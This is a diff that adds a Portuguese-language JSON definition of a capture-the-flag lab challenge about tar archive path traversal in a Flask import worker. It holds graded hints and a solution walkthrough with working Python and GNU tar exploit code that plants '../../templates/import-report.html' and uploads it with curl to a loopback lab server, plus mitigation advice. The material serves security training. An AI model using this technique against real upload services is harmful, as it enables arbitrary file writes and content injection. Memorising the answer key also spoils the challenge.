@@ -1,0 +1,83 @@
+{
+  "slug": "upload-archive-traversal",
+  "title": "Importação de bundle no FieldLens",
+  "codename": "FIELDLENS",
+  "summary": "Um portal de documentação de campo descompacta bundles tar enviados por fotógrafos sem validar os paths dos membros. Um archive forjado escapa do seu workspace e sobrescreve um template que a página de relatório renderiza.",
+  "category": "upload",
+  "difficulty": "hard",
+  "kind": "challenge",
+  "lab_dir": "upload-archive-traversal",
+  "estimated_minutes": 35,
+  "xp": 260,
+  "tech": [
+    "Flask",
+    "Python tarfile",
+    "Path traversal",
+    "Templates"
+  ],
+  "tags": [
+    "upload",
+    "tar",
+    "archive-traversal",
+    "path-traversal",
+    "file-write",
+    "template-injection"
+  ],
+  "story": "O FieldLens coleta bundles de levantamento de fotógrafos que trabalham em campo. O worker de importação aceita archives tar para que cada levantamento possa enviar uma pasta de anotações, e ele descompacta cada membro em um workspace por bundle ao lado do template store compartilhado e do diretório de assets servido. Os bundles são revisados em uma página de relatório gerada a partir desse template store. O worker roda com acesso de escrita tanto ao template store quanto à raiz de assets, e nunca inspeciona os nomes dos membros.",
+  "objective": "Envie um bundle tar cujo path de membro escape do workspace de extração, sobrescreva o template do relatório para que o relatório renderizado contenha a flag e leia-a a partir da página de relatório.",
+  "rules": "Fique na origem loopback atribuída. Apenas tráfego loopback faz parte do engajamento. Não toque em outras portas ou sistemas externos. As flags são dinâmicas e podem ser verificadas por estado.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Flag do bundle de importação",
+      "flag_type": "user",
+      "points": 260,
+      "required": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "Archives carregam paths, não nomes",
+      "body": "O worker de importação só verifica `member.isfile()` e depois chama `open(destination / member.name)`. Nada valida que o path concatenado permaneça dentro do workspace. Tente primeiro uma entrada chamada `../../look-inside/know-where.txt` para versonde os arquivos caem.",
+      "cost": 20
+    },
+    {
+      "level": 2,
+      "title": "Encontre o vizinho gravável",
+      "body": "Os workspaces ficam em `<state>/imports/<id>`. Dois diretórios existem ao lado deles: o template store renderizado por `/report` e o diretório de assets servido por `/assets/<name>`. Um path com `../` (ou um path absoluto) consegue alcançar ambos.",
+      "cost": 30
+    },
+    {
+      "level": 3,
+      "title": "Reescreva o template do relatório",
+      "body": "Adicione um membro tar chamado `../../templates/import-report.html` cujo conteúdo inclua o placeholder de template que o worker preenche. O worker renderiza as flags no contexto do relatório, então mantenha o placeholder no seu payload e faça `GET /report` depois. Tars comprimidos com gzip (`.tar.gz`) também são aceitos.",
+      "cost": 40
+    }
+  ],
+  "solution": {
+    "walkthrough": "O endpoint de importação é `POST /import` (também `/upload`) com um campo multipart chamado `bundle`. Ele lê o archive com `tarfile.open(fileobj=..., mode=\"r:*\")` e, para cada membro regular, escreve `destination / member.name` após `mkdir(parents=True)`.\n\nMonte um tar com um membro que faz traversal. `destination` é `<state>/imports/<id>`, e o template do relatório fica em `<state>/templates/import-report.html`, então dois segmentos `..` são suficientes. O template é texto puro, não Jinja: o worker substitui `{bundle}` e `{entries}` e ainda renderiza `{{ flag }}` a partir do contexto do operador, então um membro que contenha o placeholder é renderizado com a flag.\n\n```python\nimport io, tarfile, httpx\n\nbase = \"http://127.0.0.1:PORT\"\nbuf = io.BytesIO()\nwith tarfile.open(fileobj=buf, mode=\"w\") as tar:\n    payload = b\"<pre>{{ flag }}</pre>\"   # rendered by the template store\n    info = tarfile.TarInfo(\"../../templates/import-report.html\")\n    info.size = len(payload)\n    tar.addfile(info, io.BytesIO(payload))\n\nhttpx.post(f\"{base}/import\", files={\"bundle\": (\"bundle.tar\", buf.getvalue(), \"application/x-tar\")})\nprint(httpx.get(f\"{base}/report\").text)\n```\n\nEquivalente em shell com GNU tar:\n\n```bash\necho '<pre>{{ flag }}</pre>' > import-report.html\ntar --transform 's|^|../../templates/|' -cf bundle.tar import-report.html\ncurl -s -F 'bundle=@bundle.tar;type=application/x-tar' http://127.0.0.1:PORT/import\ncurl -s http://127.0.0.1:PORT/report\n```\n\nNomes de membros absolutos funcionam da mesma forma: `tarfile.TarInfo(\"<state>/templates/import-report.html\")` é concatenado ao workspace como `destination / \"/state/...\"`, o que produz o path absoluto porque `pathlib` descarta o operando da esquerda. O mesmo truque contra `../../assets/pwn.css` armazena HTML do atacante na raiz de assets servida; `/assets/pwn.css` então retorna `text/css` e `/assets/pwn.html` retorna `text/html`, o que é um segundo caminho para execução de script na mesma origem.\n\n`GET /report` renderiza o template do store e retorna a flag no corpo do relatório.",
+    "root_cause": "O importador confia nos metadados do archive. Ele concatena nomes de membros não confiáveis ao diretório de extração com `destination / member.name` e cria diretórios pai sem verificação de contenção, então segmentos `../` e paths absolutos permitem que um bundle escrevasonde a conta de serviço alcançar. O template store e o diretório de assets servido são vizinhos do workspace e são graváveis pelo mesmo worker, transformando uma primitiva de escrita em injeção de conteúdo na página de relatório.",
+    "mitigation": "Resolva cada alvo com `Path.resolve()` e rejeite membros cujo path resolvido não esteja dentro da raiz de extração resolvida (`tarfile.extractall(..., filter=\"data\")` do Python, que é o padrão a partir do Python 3.12, já recusa membros `..`, paths absolutos e links). Rejeite symlinks e hardlinks, limite a quantidade e o tamanho dos membros com base em um orçamento de descompressão, descompacte em um diretório novo pertencente a um worker sem privilégios e mantenha templates e raízes de estáticos em um mount somente leitura para essa conta. Sirva o conteúdo enviado a partir de uma origem separada com `Content-Disposition: attachment`."
+  },
+  "references": [
+    {
+      "title": "Python docs — tarfile: Extraction filters (data_filter, absolute path and .. rejection)",
+      "url": "https://docs.python.org/3/library/tarfile.html#extraction-filters",
+      "source_type": "official",
+      "description": "Orientação oficial sobre extração segura de archives não confiáveis, incluindo a correção do CVE-2007-4559."
+    },
+    {
+      "title": "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
+      "url": "https://cwe.mitre.org/data/definitions/22.html",
+      "source_type": "standard",
+      "description": "Classe de fraqueza por trás de path traversal em membros de archive."
+    },
+    {
+      "title": "HackTricks — Tar file exploitation (arbitrary file write)",
+      "url": "https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html",
+      "source_type": "research",
+      "description": "Técnicas práticas para abusar da extração de archives e escrever arquivos arbitrários."
+    }
+  ]
+}
